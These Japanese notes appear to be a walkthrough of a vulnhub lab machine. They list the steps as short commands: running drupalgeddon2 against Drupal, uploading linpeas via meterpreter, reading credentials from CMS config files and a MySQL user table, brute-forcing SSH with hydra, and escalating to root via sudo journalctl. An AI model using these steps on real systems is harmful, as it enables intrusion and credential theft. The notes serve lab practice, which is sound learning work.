### 論点
- cmsの設定ファイル
### keyword
- drupalの脆弱性、mysql,hydra,passwordを探す、rbash,sudo-l(journalctl)
### 課題
- ユーザでC2Cできるんでないか?
- 各cmsのtemplateにreverse-shellを書き込んでセッションを確立させる

## 攻略
- nmapするとcmsが3つあるのがわかる
- drupalに対してはdrupal_geddon2をやってみる
- 対話型シェルにする
- システム内を探索する
  - いろいろ探す
- linpeas.shをuploadする
  - `bg`コマンドでParrotにシェルを戻す
  - `~/vulnhub/sickos`にlinpeas.shをコピーしてくる 
- ここからはmsfconsoleに戻る
  - `sessions -i 1` 
  - `meterpreter > upload linpeas.sh /tmp`   
  - `chmod +x linpeas.sh`
  - `./linpeas.sh` 
  - `cat /var/www/html/drupal/misc/tyrell.pass`
    - このファイルは所有ユーザ、グループともにrootで他のはtyrellなので不自然 
  - (これでもいい)
    - `(Meterpreter) > search -d / -f *.pass`
- suコマンドで切り替え
- suid
  - pkexecもgccもあるのでできそう 
- sudo -l

```
sudo journalctl
!/bin/bash
```

### 設定ファイルをチェックする
- ユーザ名をリストにする
- CMSに入ったらまずするのは、各設定ファイルをチェックする。ユーザ名とパスワードを取得
  - wordpress `/var/html/wordpress/public_html/wp-config.php`
  - drupal `/var/html/drupal/sites/defaults/settings.php`
  - joomla `/var/html/joomla/configuration.php`
- wordpress,drupalのmysqlは何もない
- joomlaのMySQLをチェックする
  - `show databases;`
  - `use joomla_db;`
  - `show tables;`
  - `select * from hs23w_users;` 
  - mailがパスワードになっているのでチェックする
- userとpasswordを使って、hydraをする
- sshでログインする
- rbashでコマンドが制限されている

